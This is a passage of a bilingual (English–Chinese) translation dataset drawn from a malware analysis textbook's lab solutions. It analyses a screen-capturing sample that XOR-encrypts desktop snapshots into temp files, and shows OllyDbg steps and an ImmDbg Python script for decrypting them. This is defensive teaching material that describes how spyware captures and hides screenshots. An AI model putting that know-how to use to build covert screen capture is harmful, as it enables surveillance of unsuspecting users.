  type: TYPE_NORMAL
  zh: xor ecx, [eax+10h]
- en: 004017C9
  id: totrans-4304
  prefs: []
  type: TYPE_NORMAL
  zh: 004017C9
- en: sub_401739
  id: totrans-4305
  prefs: []
  type: TYPE_NORMAL
  zh: sub_401739
- en: xor ecx, eax
  id: totrans-4306
  prefs: []
  type: TYPE_NORMAL
  zh: xor ecx, eax
- en: 004017D4
  id: totrans-4307
  prefs: []
  type: TYPE_NORMAL
  zh: 004017D4
- en: sub_401739
  id: totrans-4308
  prefs: []
  type: TYPE_NORMAL
  zh: sub_401739
- en: xor ecx, eax
  id: totrans-4309
  prefs: []
  type: TYPE_NORMAL
  zh: xor ecx, eax
- en: 004017E5
  id: totrans-4310
  prefs: []
  type: TYPE_NORMAL
  zh: 004017E5
- en: sub_401739
  id: totrans-4311
  prefs: []
  type: TYPE_NORMAL
  zh: sub_401739
- en: xor edx, [ecx+18h]
  id: totrans-4312
  prefs: []
  type: TYPE_NORMAL
  zh: xor edx, [ecx+18h]
- en: 004017F1
  id: totrans-4313
  prefs: []
  type: TYPE_NORMAL
  zh: 004017F1
- en: sub_401739
  id: totrans-4314
  prefs: []
  type: TYPE_NORMAL
  zh: sub_401739
- en: xor edx, ecx
  id: totrans-4315
  prefs: []
  type: TYPE_NORMAL
  zh: xor edx, ecx
- en: 004017FC
  id: totrans-4316
  prefs: []
  type: TYPE_NORMAL
  zh: 004017FC
- en: sub_401739
  id: totrans-4317
  prefs: []
  type: TYPE_NORMAL
  zh: sub_401739
- en: xor edx, ecx
  id: totrans-4318
  prefs: []
  type: TYPE_NORMAL
  zh: xor edx, ecx
- en: 0040191E
  id: totrans-4319
  prefs: []
  type: TYPE_NORMAL
  zh: 0040191E
- en: _main
  id: totrans-4320
  prefs: []
  type: TYPE_NORMAL
  zh: _main
- en: xor eax, eax 
  id: totrans-4321
  prefs: []
  type: TYPE_NORMAL
  zh: xor eax, eax 
- en: 0040311A
  id: totrans-4322
  prefs: []
  type: TYPE_NORMAL
  zh: 0040311A
- en: xor dh, [eax] 
  id: totrans-4323
  prefs: []
  type: TYPE_NORMAL
  zh: xor dh, [eax] 
- en: 0040311E
  id: totrans-4324
  prefs: []
  type: TYPE_NORMAL
  zh: 0040311E
- en: xor [eax], dh 
  id: totrans-4325
  prefs: []
  type: TYPE_NORMAL
  zh: xor [eax], dh 
- en: 00403688
  id: totrans-4326
  prefs: []
  type: TYPE_NORMAL
  zh: 00403688
- en: xor ecx, ecx 
  id: totrans-4327
  prefs: []
  type: TYPE_NORMAL
  zh: xor ecx, ecx 
- en: 004036A5
  id: totrans-4328
  prefs: []
  type: TYPE_NORMAL
  zh: 004036A5
- en: xor edx, edx 
  id: totrans-4329
  prefs: []
  type: TYPE_NORMAL
  zh: xor edx, edx 
- en: 'The instructions labeled  in Table 13-1L represent the clearing of a register
    and can be ignored. The instructions labeled  are contained in library functions
    and can also be ignored. We are left with two functions of interest: sub_40128D
     and sub_401739 . Additionally, at 0x0040171F is in an area of code  that has
    not been defined as a function.'
  id: totrans-4330
  prefs: []
  type: TYPE_NORMAL
  zh: 表 13-1L 中标记为  的指令表示寄存器的清除，可以忽略。标记为  的指令包含在库函数中，也可以忽略。我们剩下两个有趣的功能：sub_40128D
     和 sub_401739 。此外，在 0x0040171F 处的代码区域  没有被定义为函数。
- en: '**1 3**'
  id: totrans-4331
  prefs: []
  type: TYPE_NORMAL
  zh: '**1 3**'
- en: We’ll refer to sub_401739 as heavy_xor since
  id: totrans-4332
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将把 sub_401739 称为 heavy_xor，因为
- en: it has so many xor instructions, and sub_40128D
  id: totrans-4333
  prefs: []
  type: TYPE_NORMAL
  zh: 它有如此多的 xor 指令，还有 sub_40128D
- en: as single_xor since it has only one. heavy_xor
  id: totrans-4334
  prefs: []
  type: TYPE_NORMAL
  zh: 作为 single_xor，因为它只有一个。heavy_xor
- en: takes four arguments, and it is a single loop
  id: totrans-4335
  prefs: []
  type: TYPE_NORMAL
  zh: 有四个参数，并且是一个单循环
- en: with a large block of code containing many
  id: totrans-4336
  prefs: []
  type: TYPE_NORMAL
  zh: 包含大量代码的大块，其中包含许多
- en: SHL and SHR instructions in addition to the xor
  id: totrans-4337
  prefs: []
  type: TYPE_NORMAL
  zh: 除了 xor 指令外，还有 SHL 和 SHR 指令
- en: instructions. Looking at the functions called
  id: totrans-4338
  prefs: []
  type: TYPE_NORMAL
  zh: 指令。查看调用的函数
- en: by heavy_xor, we see that single_xor is related to
  id: totrans-4339
  prefs: []
  type: TYPE_NORMAL
  zh: 通过 heavy_xor，我们看到 single_xor 与
- en: heavy_xor since the caller of single_xor is also
  id: totrans-4340
  prefs: []
  type: TYPE_NORMAL
  zh: heavy_xor，因为 single_xor 的调用者也是
- en: called by heavy_xor, as shown in Figure 13-4L.
  id: totrans-4341
  prefs: []
  type: TYPE_NORMAL
  zh: 由 heavy_xor 调用，如图 13-4L 所示。
- en: '*Figure 13-4L: Relationship of*'
  id: totrans-4342
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 13-4L：* 的关系'
- en: Looking at the xor instruction at  in
  id: totrans-4343
  prefs: []
  type: TYPE_NORMAL
  zh: 观察图中的 xor 指令 
- en: '*encryption functions*'
  id: totrans-4344
  prefs: []
  type: TYPE_NORMAL
  zh: '*加密函数*'
- en: Table 13-1L (0x0040171F), we see that it is in
  id: totrans-4345
  prefs: []
  type: TYPE_NORMAL
  zh: 表 13-1L (0x0040171F)，我们看到它位于
- en: a function, but the function was not automatically identified due to lack of
    use. Defining a function at 0x00401570 results in the creation of a function that
    encompasses the previously orphaned xor instruction. As seen in Figure 13-4L,
    this unused function is also related to the same cluster of likely encoding functions.
  id: totrans-4346
  prefs: []
  type: TYPE_NORMAL
  zh: 这是一个函数，但由于使用不足，该函数没有被自动识别。在 0x00401570 处定义一个函数会导致创建一个包含之前孤立 xor 指令的函数。如图 13-4L
    所示，这个未使用的函数也与同一组的可能编码函数相关。
- en: To confirm that heavy_xor is the encoding function, let’s see how it is related
    to the *temp* files that were written to disk. We can find where the data is written
    to disk, and then trace backward to determine if and how encoding functions are
    used. Looking at the imported functions, we see WriteFile.
  id: totrans-4347
  prefs: []
  type: TYPE_NORMAL
  zh: 为了确认 heavy_xor 是编码函数，让我们看看它与写入磁盘的 *temp* 文件之间的关系。我们可以找到数据写入磁盘的位置，然后回溯以确定是否以及如何使用编码函数。查看导入的函数，我们看到
    WriteFile。
- en: Checking the cross-references to WriteFile, we find sub_401000, which takes
    as arguments a buffer, a length, and a filename, and opens the file and Solutions
    to Labs
  id: totrans-4348
  prefs: []
  type: TYPE_NORMAL
  zh: 检查 WriteFile 的交叉引用，我们发现 sub_401000，它接受缓冲区、长度和文件名作为参数，并打开文件和实验解决方案
- en: '**613**'
  id: totrans-4349
  prefs: []
  type: TYPE_NORMAL
  zh: '**613**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-4350
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: writes the buffer to the file. We’ll rename sub_401000 to writeBufferToFile.
  id: totrans-4351
  prefs: []
  type: TYPE_NORMAL
  zh: 将缓冲区写入文件。我们将 sub_401000 重命名为 writeBufferToFile。
- en: sub_401851 is the only function that calls writeBufferToFile, and Listing 13-6L
  id: totrans-4352
  prefs: []
  type: TYPE_NORMAL
  zh: sub_401851 是唯一调用 writeBufferToFile 的函数，列表 13-6L
- en: shows the contents of sub_401851 (which we rename doStuffAndWriteFile), leading
    up to the call to writeBufferToFile at .
  id: totrans-4353
  prefs: []
  type: TYPE_NORMAL
  zh: 显示了 sub_401851（我们将其重命名为 doStuffAndWriteFile）的内容，直到调用 writeBufferToFile 的位置 。
- en: lea eax, [ebp+nNumberOfBytesToWrite]
  id: totrans-4354
  prefs: []
  type: TYPE_NORMAL
  zh: lea eax, [ebp+nNumberOfBytesToWrite]
- en: push eax
  id: totrans-4355
  prefs: []
  type: TYPE_NORMAL
  zh: push eax
- en: lea ecx, [ebp+lpBuffer]
  id: totrans-4356
  prefs: []
  type: TYPE_NORMAL
  zh: lea ecx, [ebp+lpBuffer]
- en: push ecx
  id: totrans-4357
  prefs: []
  type: TYPE_NORMAL
  zh: push ecx
- en: call sub_401070  ; renamed to getContent
  id: totrans-4358
  prefs: []
  type: TYPE_NORMAL
  zh: call sub_401070  ; 重命名为 getContent
- en: add esp, 8
  id: totrans-4359
  prefs: []
  type: TYPE_NORMAL
  zh: add esp, 8
- en: mov edx, [ebp+nNumberOfBytesToWrite]
  id: totrans-4360
  prefs: []
  type: TYPE_NORMAL
  zh: mov edx, [ebp+nNumberOfBytesToWrite]
- en: push edx
  id: totrans-4361
  prefs: []
  type: TYPE_NORMAL
  zh: push edx
- en: mov eax, [ebp+lpBuffer]
  id: totrans-4362
  prefs: []
  type: TYPE_NORMAL
  zh: mov eax, [ebp+lpBuffer]
- en: push eax
  id: totrans-4363
  prefs: []
  type: TYPE_NORMAL
  zh: push eax
- en: call sub_40181F  ; renamed to encodingWrapper
  id: totrans-4364
  prefs: []
  type: TYPE_NORMAL
  zh: call sub_40181F  ; 重命名为 encodingWrapper
- en: add esp, 8
  id: totrans-4365
  prefs: []
  type: TYPE_NORMAL
  zh: add esp, 8
- en: call ds:GetTickCount 
  id: totrans-4366
  prefs: []
  type: TYPE_NORMAL
  zh: call ds:GetTickCount 
- en: mov [ebp+var_4], eax
  id: totrans-4367
  prefs: []
  type: TYPE_NORMAL
  zh: mov [ebp+var_4], eax
- en: mov ecx, [ebp+var_4]
  id: totrans-4368
  prefs: []
  type: TYPE_NORMAL
  zh: mov ecx, [ebp+var_4]
- en: push ecx
  id: totrans-4369
  prefs: []
  type: TYPE_NORMAL
  zh: push ecx
- en: push offset Format ; "temp%08x" 
  id: totrans-4370
  prefs: []
  type: TYPE_NORMAL
  zh: push offset Format ; "temp%08x" 
- en: lea edx, [ebp+FileName]
  id: totrans-4371
  prefs: []
  type: TYPE_NORMAL
  zh: lea edx, [ebp+FileName]
- en: push edx ; Dest
  id: totrans-4372
  prefs: []
  type: TYPE_NORMAL
  zh: push edx ; 目标
- en: call _sprintf
  id: totrans-4373
  prefs: []
  type: TYPE_NORMAL
  zh: call _sprintf
- en: add esp, 0Ch
  id: totrans-4374
  prefs: []
  type: TYPE_NORMAL
  zh: add esp, 0Ch
- en: lea eax, [ebp+FileName] 
  id: totrans-4375
  prefs: []
  type: TYPE_NORMAL
  zh: lea eax, [ebp+FileName] 
- en: push eax ; lpFileName
  id: totrans-4376
  prefs: []
  type: TYPE_NORMAL
  zh: push eax ; lpFileName
- en: mov ecx, [ebp+nNumberOfBytesToWrite]
  id: totrans-4377
  prefs: []
  type: TYPE_NORMAL
  zh: mov ecx, [ebp+nNumberOfBytesToWrite]
- en: push ecx ; nNumberOfBytesToWrite
  id: totrans-4378
  prefs: []
  type: TYPE_NORMAL
  zh: push ecx ; nNumberOfBytesToWrite
- en: mov edx, [ebp+lpBuffer]
  id: totrans-4379
  prefs: []
  type: TYPE_NORMAL
  zh: mov edx, [ebp+lpBuffer]
- en: push edx ; lpBuffer
  id: totrans-4380
  prefs: []
  type: TYPE_NORMAL
  zh: push edx ; lpBuffer
- en: call writeBufferToFile 
  id: totrans-4381
  prefs: []
  type: TYPE_NORMAL
  zh: call writeBufferToFile 
- en: '*Listing 13-6L: Writing encrypted files*'
  id: totrans-4382
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 13-6L：写入加密文件*'
- en: Working from the start of Listing 13-6L, we see two function calls to sub_401070
    at  and sub_40181F at  that both use the buffer and length as arguments. The
    format string "temp%08x" at  combined with the result of GetTickCount at  reveals
    the source of the filename, which is the current time printed in hexadecimal.
    IDA Pro has labeled the filename, as indicated at .
  id: totrans-4383
  prefs: []
  type: TYPE_NORMAL
  zh: 从列表 13-6L 的开头开始，我们看到两个函数调用 sub_401070 在  和 sub_40181F 在 ，它们都使用缓冲区和长度作为参数。格式字符串
    "temp%08x" 在  与 GetTickCount 在  的结果相结合，揭示了文件名的来源，即以十六进制形式打印的当前时间。IDA Pro 已经标记了文件名，如
     所示。
- en: From the code in Listing 13-6L, a good hypothesis is that sub_401070 at  is
    used to fetch some content (let’s call it getContent), and that sub_40181F at
    
  id: totrans-4384
  prefs: []
  type: TYPE_NORMAL
  zh: 从列表 13-6L 中的代码来看，一个合理的假设是 sub_401070 在  处用于获取一些内容（让我们称其为 getContent），而 sub_40181F
    在 
- en: is used to encrypt the contents (which we’ll rename encodingWrapper).
  id: totrans-4385
  prefs: []
  type: TYPE_NORMAL
  zh: 用于加密内容（我们将它重命名为 encodingWrapper）。
- en: 'Looking first at our hypothesized encoding function encodingWrapper (at 0x0040181F),
    we see that it is merely a wrapper for heavy_xor. This confirms that the functions
    depicted in Figure 13-4L are our encoding functions. The function encodingWrapper
    sets up four arguments for the encoding: a local variable that is cleared before
    use, two pointers both pointing to the same buffer that is passed in from doStuffAndWriteFile,
    and a buffer size that is also passed in from doStuffAndWriteFile. The two pointers
    pointing to the same buffer **614**'
  id: totrans-4386
  prefs: []
  type: TYPE_NORMAL
  zh: 首先看看我们假设的编码函数 encodingWrapper（在 0x0040181F 处），我们看到它只是 heavy_xor 的包装器。这证实了图 13-4L
    中显示的函数是我们的编码函数。encodingWrapper 函数为编码设置了四个参数：一个在使用前被清除的局部变量，两个都指向从 doStuffAndWriteFile
    传入的同一缓冲区的指针，以及一个也从 doStuffAndWriteFile 传入的缓冲区大小。两个指向同一缓冲区的指针 **614**
- en: Appendix C
  id: totrans-4387
  prefs: []
  type: TYPE_NORMAL
  zh: 附录 C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-4388
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: suggest that the encoding function takes source and destination buffers along
    with a length, and that, in this case, the encoding is performed in place.
  id: totrans-4389
  prefs: []
  type: TYPE_NORMAL
  zh: 表明编码函数接受源和目标缓冲区以及长度，并且在这种情况下，编码是在原地执行的。
- en: Next, we identify the source of the content that is encoded and written to disk.
    As we mentioned earlier, the function getContent (at 0x00401070) appears to acquire
    some content. Looking at getContent, we see a single block of code with numerous
    system functions, as shown in Listing 13-7L.
  id: totrans-4390
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们确定编码并写入磁盘的内容来源。正如我们之前提到的，函数 getContent（在 0x00401070）似乎获取了一些内容。查看 getContent，我们看到一个包含许多系统函数的单个代码块，如列表
    13-7L 所示。
- en: GetSystemMetrics
  id: totrans-4391
  prefs: []
  type: TYPE_NORMAL
  zh: GetSystemMetrics
- en: '**GetDesktopWindow**'
  id: totrans-4392
  prefs: []
  type: TYPE_NORMAL
  zh: '**GetDesktopWindow**'
- en: GetDC
  id: totrans-4393
  prefs: []
  type: TYPE_NORMAL
  zh: GetDC
- en: CreateCompatibleDC
  id: totrans-4394
  prefs: []
  type: TYPE_NORMAL
  zh: CreateCompatibleDC
- en: CreateCompatibleBitmap
  id: totrans-4395
  prefs: []
  type: TYPE_NORMAL
  zh: CreateCompatibleBitmap
- en: SelectObject
  id: totrans-4396
  prefs: []
  type: TYPE_NORMAL
  zh: SelectObject
- en: '**BitBlt**'
  id: totrans-4397
  prefs: []
  type: TYPE_NORMAL
  zh: '**BitBlt**'
- en: GetObjectA
  id: totrans-4398
  prefs: []
  type: TYPE_NORMAL
  zh: GetObjectA
- en: GlobalAlloc
  id: totrans-4399
  prefs: []
  type: TYPE_NORMAL
  zh: GlobalAlloc
- en: GlobalLock
  id: totrans-4400
  prefs: []
  type: TYPE_NORMAL
  zh: GlobalLock
- en: '**GetDIBits**'
  id: totrans-4401
  prefs: []
  type: TYPE_NORMAL
  zh: '**GetDIBits**'
- en: _memcpy
  id: totrans-4402
  prefs: []
  type: TYPE_NORMAL
  zh: _memcpy
- en: GlobalUnlock
  id: totrans-4403
  prefs: []
  type: TYPE_NORMAL
  zh: GlobalUnlock
- en: GlobalFree
  id: totrans-4404
  prefs: []
  type: TYPE_NORMAL
  zh: GlobalFree
- en: ReleaseDC
  id: totrans-4405
  prefs: []
  type: TYPE_NORMAL
  zh: ReleaseDC
- en: DeleteDC
  id: totrans-4406
  prefs: []
  type: TYPE_NORMAL
  zh: DeleteDC
- en: DeleteObject
  id: totrans-4407
  prefs: []
  type: TYPE_NORMAL
  zh: DeleteObject
- en: '*Listing 13-7L: Windows API functions called in getContent (sub_401070)* Based
    on this list, it is a good guess that this function is trying to capture **1 3**'
  id: totrans-4408
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 13-7L：getContent（sub_401070）中调用的 Windows API 函数* 根据这个列表，可以合理推测这个函数试图捕获
    **1 3**'
- en: the screen. Notably, GetDesktopWindow (bolded) gets a handle to the desktop
    window that covers the entire screen, and the functions BitBlt and GetDIBits (also
    bolded) are related to retrieving bitmap information and copying it to a buffer.
  id: totrans-4409
  prefs: []
  type: TYPE_NORMAL
  zh: 屏幕。值得注意的是，GetDesktopWindow（粗体）获取覆盖整个屏幕的桌面窗口的句柄，而 BitBlt 和 GetDIBits（也粗体）函数与检索位图信息和将其复制到缓冲区有关。
- en: We conclude that the malware repeatedly takes snapshots of the user’s desktop
    and writes an encrypted version of the screen capture to a file.
  id: totrans-4410
  prefs: []
  type: TYPE_NORMAL
  zh: 我们得出结论，恶意软件反复捕获用户的桌面快照，并将加密的屏幕捕获版本写入文件。
- en: In order to verify our conclusion, we can take one of the captured files, run
    it back through the encryption algorithm, and retrieve the originally captured
    image. (This assumes that the algorithm is a stream cipher and that encryption
    is reversible; that is, encryption and decryption do the same thing).
  id: totrans-4411
  prefs: []
  type: TYPE_NORMAL
  zh: 为了验证我们的结论，我们可以取一个捕获的文件，将其通过加密算法再次运行，并检索原始捕获的图像。（这假设算法是流密码，并且加密是可逆的；也就是说，加密和解密做同样的事情）。
- en: Since we have few clues about the algorithm used, the easiest way to implement
    this is to use instrumentation and let the code perform the decoding for us.
  id: totrans-4412
  prefs: []
  type: TYPE_NORMAL
  zh: 由于我们对使用的算法知之甚少，实现它的最简单方法是使用仪器，让代码为我们执行解码。
- en: 'Since the code already has instructions that take a buffer, encrypt it, and
    then write it to a file, we’ll reuse them as follows:'
  id: totrans-4413
  prefs: []
  type: TYPE_NORMAL
  zh: 由于代码已经包含取缓冲区、加密并将其写入文件的指令，我们将重用它们如下：
- en: 
  id: totrans-4414
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: Let the program run as normal until just before encryption.
  id: totrans-4415
  prefs: []
  type: TYPE_NORMAL
  zh: 让程序正常运行，直到加密之前。
- en: 
  id: totrans-4416
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: Replace the buffer holding the screen capture with a buffer holding a previously
    saved file that we wish to decrypt.
  id: totrans-4417
  prefs: []
  type: TYPE_NORMAL
  zh: 将包含屏幕捕获的缓冲区替换为包含我们希望解密的先前保存文件的缓冲区。
- en: 
  id: totrans-4418
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: Let the program write the output to the temporary filename based on the current
    time.
  id: totrans-4419
  prefs: []
  type: TYPE_NORMAL
  zh: 让程序将输出写入基于当前时间的临时文件名。
- en: 
  id: totrans-4420
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: Break the program after the first file is written.
  id: totrans-4421
  prefs: []
  type: TYPE_NORMAL
  zh: 在第一个文件写入后中断程序。
- en: Solutions to Labs
  id: totrans-4422
  prefs: []
  type: TYPE_NORMAL
  zh: 实验室解决方案
- en: '**615**'
  id: totrans-4423
  prefs: []
  type: TYPE_NORMAL
  zh: '**615**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-4424
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: We can implement this strategy manually using OllyDbg or use a script-based
    approach to provide more flexibility. We’ll look at the manual approach first.
  id: totrans-4425
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以使用 OllyDbg 手动实现此策略，或者使用基于脚本的策略以提供更多灵活性。我们首先看看手动方法。
- en: '**Decoding Using OllyDbg**'
  id: totrans-4426
  prefs: []
  type: TYPE_NORMAL
  zh: '**使用 OllyDbg 进行解码**'
- en: We can implement the instrumentation strategy using OllyDbg by identifying two
    key breakpoints. The first will be just before encoding, so we can use 0x00401880
    as the breakpoint, where the call to encodingWrapper occurs ( in Listing 13-6L).
    The second breakpoint will be after the first file is written, so we set it at
    0x0040190A.
  id: totrans-4427
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以使用 OllyDbg 通过识别两个关键断点来实现仪器策略。第一个将在编码之前，因此我们可以使用 0x00401880 作为断点，在那里调用 encodingWrapper（列表
    13-6L 中的）。第二个断点将在第一个文件写入之后设置，因此我们将其设置为 0x0040190A。
- en: After starting the malware with OllyDbg, setting the breakpoints, and running
    the program, the malware will stop at the first breakpoint (0x00401880). At this
    point, the arguments on the stack represent the buffer to be encrypted and its
    length.
  id: totrans-4428
  prefs: []
  type: TYPE_NORMAL
  zh: 在使用OllyDbg启动恶意软件、设置断点和运行程序后，恶意软件将在第一个断点（0x00401880）处停止。此时，堆栈上的参数代表要加密的缓冲区和其长度。
- en: Right-click the top value on the stack in the stack pane (the value located
    at ESP) and select **Follow in Dump**. Next, open one of the encrypted files that
    the malware created in WinHex and select **Edit****Copy All****Hex Values**.
  id: totrans-4429
  prefs: []
  type: TYPE_NORMAL
  zh: 右键点击堆栈面板顶部值（位于ESP处的值）并选择**在转储中跟踪**。接下来，在WinHex中打开恶意软件创建的其中一个加密文件，并选择**编辑****复制全部****十六进制值**。
- en: Then, in OllyDbg, select the values from the top of the dump pane to the end
    of the memory block (OllyDbg requires the entire target area to be selected before
    allowing you to paste content). This selection represents the buffer that is about
    to be encoded, which we will now fill with the contents of the file. (Don’t worry
    if the memory block is longer than the buffer size; OllyDbg will paste the content
    only up to the length of the file.) Now right-click the Hex dump portion of the
    dump pane and select **Binary**
  id: totrans-4430
  prefs: []
  type: TYPE_NORMAL
  zh: 然后，在OllyDbg中，从转储面板的顶部值选择到内存块末尾（OllyDbg要求在允许你粘贴内容之前选择整个目标区域）。这个选择代表即将编码的缓冲区，我们现在将文件内容填充到这个缓冲区中。（如果内存块长度大于缓冲区大小，请不要担心；OllyDbg只会粘贴文件长度范围内的内容。）现在右键点击转储面板的十六进制转储部分并选择**二进制**
- en: '**Binary Paste**. (If you’re using an editor that allows you to copy binary
    values directly, paste into the ASCII portion of the dump pane instead.) With
    the buffer prepared, run OllyDbg until the final breakpoint, and then check the
    malware’s directory for a new file with the same naming convention as the previously
    created ones. Give this file a *.bmp* extension and open it. You should see a
    screenshot that was taken while the malware was running.'
  id: totrans-4431
  prefs: []
  type: TYPE_NORMAL
  zh: '**二进制粘贴**。 (如果你使用的编辑器允许你直接复制二进制值，请将它们粘贴到转储面板的ASCII部分。) 准备好缓冲区后，运行OllyDbg直到最后一个断点，然后检查恶意软件目录中是否有与之前创建的文件具有相同命名约定的新文件。给这个文件添加*.bmp*扩展名并打开它。你应该能看到恶意软件运行时拍摄的截图。'
- en: '**NOTE**'
  id: totrans-4432
  prefs: []
  type: TYPE_NORMAL
  zh: '**注意**'
- en: '*Ensure that the file size is the same as that of the second argument passed
    to the encryption function. If you didn’t change the screen resolution between
    the initial malware* *run and this decryption run, the sizes should be the same.
    If the file size is larger than* *the memory buffer, this technique may fail.*'
  id: totrans-4433
  prefs: []
  type: TYPE_NORMAL
  zh: '*确保文件大小与传递给加密函数的第二个参数相同。如果在初始恶意软件运行和这次解密运行之间没有更改屏幕分辨率，大小应该相同。如果文件大小大于* *内存缓冲区，这种技术可能会失败。*'
- en: '**Scripting the Solution**'
  id: totrans-4434
  prefs: []
  type: TYPE_NORMAL
  zh: '**脚本化解决方案**'
- en: In order to implement the instrumentation strategy more generically (in a way
    that does not depend on available buffer sizes), we use the Python-based debugger
    API in Immunity Debugger (ImmDbg), as discussed in “Scriptable Debugging” on page
    200, as well as in Chapter 13\. We create the Python script shown in Listing 13-8L
    by saving the file with a *.py* extension in the *PyScripts* folder under the
    ImmDbg installation directory.
  id: totrans-4435
  prefs: []
  type: TYPE_NORMAL
  zh: '为了更通用地实现仪器策略（不依赖于可用的缓冲区大小），我们使用Immunity Debugger中的基于Python的调试器API（ImmDbg），如第200页的“可脚本调试”以及第13章中所述。我们通过在ImmDbg安装目录下的*PyScripts*文件夹中保存具有*.py*扩展名的Python脚本，创建了如列表13-8L所示的脚本。 '
- en: '**NOTE**'
  id: totrans-4436
  prefs: []
  type: TYPE_NORMAL
  zh: '**注意**'
- en: '*Customize the example filename* (C:\\temp062da212) *opened and assigned to
    cfile* *at*  *in Listing 13-8L based on your environment.*'
  id: totrans-4437
  prefs: []
  type: TYPE_NORMAL
  zh: '*根据你的环境自定义示例文件名*（C:\\temp062da212）*在列表13-8L中打开并分配给cfile* *。*'
- en: '**616**'
  id: totrans-4438
  prefs: []
  type: TYPE_NORMAL
  zh: '**616**'
- en: Appendix C
  id: totrans-4439
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-4440
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '#!/usr/bin/env python'
  id: totrans-4441
  prefs: []
  type: TYPE_NORMAL
  zh: '#!/usr/bin/env python'
- en: import immlib
  id: totrans-4442
  prefs: []
  type: TYPE_NORMAL
  zh: import immlib
- en: 'def main():'
  id: totrans-4443
  prefs: []
  type: TYPE_NORMAL
  zh: 'def main():'
- en: imm = immlib.Debugger()
  id: totrans-4444
  prefs: []
  type: TYPE_NORMAL
  zh: imm = immlib.Debugger()
- en: 'imm.setBreakpoint(0x00401875) # break just before pushing args for encoding
    imm.Run() # Execute until breakpoint before crypto cfile = open("C:\\temp062da212",''rb'')
    '
  id: totrans-4445
  prefs: []
  type: TYPE_NORMAL
  zh: 'imm.setBreakpoint(0x00401875) # 在推送编码参数之前断点 imm.Run() # 执行直到加密前的断点 cfile =
    open("C:\\temp062da212",''rb'') '
- en: 'buffer = cfile.read() # Read encrypted file into buffer sz = len (buffer)'
  id: totrans-4446
  prefs: []
  type: TYPE_NORMAL
  zh: 'buffer = cfile.read() # 将加密文件读入buffer sz = len (buffer)'
- en: membuf = imm.remoteVirtualAlloc(sz) 
  id: totrans-4447
  prefs: []
  type: TYPE_NORMAL
  zh: membuf = imm.remoteVirtualAlloc(sz) 
- en: Allocate memory within debugger process
  id: totrans-4448
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 在调试器进程中分配内存
- en: imm.writeMemory(membuf,buffer)
  id: totrans-4449
  prefs: []
  type: TYPE_NORMAL
  zh: imm.writeMemory(membuf,buffer)
- en: regs = imm.getRegs()
  id: totrans-4450
  prefs: []
  type: TYPE_NORMAL
  zh: regs = imm.getRegs()
- en: 'imm.writeLong(regs[''EBP'']-12, membuf)  # Set stack variables imm.writeLong(regs[''EBP'']-8,
    sz)'
  id: totrans-4451
  prefs: []
  type: TYPE_NORMAL
  zh: 'imm.writeLong(regs[''EBP'']-12, membuf)  # 设置堆栈变量 imm.writeLong(regs[''EBP'']-8,
    sz)'
- en: 'imm.setBreakpoint(0x0040190A) # after single loop imm.Run()'
  id: totrans-4452
  prefs: []
  type: TYPE_NORMAL
  zh: 'imm.setBreakpoint(0x0040190A) # 在单循环之后 imm.Run()'
- en: '*Listing 13-8L: ImmDbg decryption script*'
  id: totrans-4453
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 13-8L：ImmDbg 解密脚本*'
- en: As you can see in Listing 13-8L, the first breakpoint stops execution just before
    the arguments are pushed on the stack. The open call at  opens the encrypted
    file that has already been written to the filesystem. The next few lines read
    the file into memory and calculate the size of the buffer. The remoteVirtualAlloc
    call at  is used to create an appropriately sized buffer in the memory of the
    running process, and writeMemory is used to copy the file contents into that new
    buffer. The two writeLong calls at  replace the stack **1 3**
  id: totrans-4454
  prefs: []
  type: TYPE_NORMAL
  zh: 如列表 13-8L 所示，第一个断点在将参数推送到堆栈之前停止执行。在  处的打开调用打开已写入文件系统的加密文件。接下来的几行将文件读入内存并计算缓冲区的大小。在
     处的 remoteVirtualAlloc 调用用于在运行进程的内存中创建适当大小的缓冲区，writeMemory 用于将文件内容复制到该新缓冲区。在
     处的两个 writeLong 调用替换了堆栈上的 **1 3**
- en: variables for the buffer to be encrypted and its size. The next few instructions
    push those variables onto the stack to be used for the following encryption routine
    and the writing of the file.
  id: totrans-4455
  prefs: []
  type: TYPE_NORMAL
  zh: 用于加密的缓冲区及其大小的变量。接下来的几条指令将这些变量推送到堆栈上，以便用于后续的加密例程和文件的写入。
- en: Open the malware in ImmDbg, choose **ImmLib****Run Python Script**, and then
    select the script that has been created. The script should run, and the debugger
    should halt at the second breakpoint. At this point, the malware should have written
    a single file in its own directory. Navigate to the malware’s directory and identify
    the most recently written file. Change the extension of this file to *.bmp* and
    open it. You should see the decrypted screenshot that was taken earlier by the
    malware.
  id: totrans-4456
  prefs: []
  type: TYPE_NORMAL
  zh: 在 ImmDbg 中打开恶意软件，选择 **ImmLib****运行 Python 脚本**，然后选择已创建的脚本。脚本应该运行，调试器应该在第二个断点处停止。此时，恶意软件应该在其自己的目录中写入一个文件。导航到恶意软件的目录并识别最近写入的文件。将此文件的扩展名更改为
    *.bmp* 并打开它。你应该看到恶意软件之前拍摄的解密截图。
- en: '**Lab 13-3 Solutions**'
  id: totrans-4457
  prefs: []
  type: TYPE_NORMAL
  zh: '**实验室 13-3 解决方案**'
- en: '***Short Answers***'
  id: totrans-4458
  prefs: []
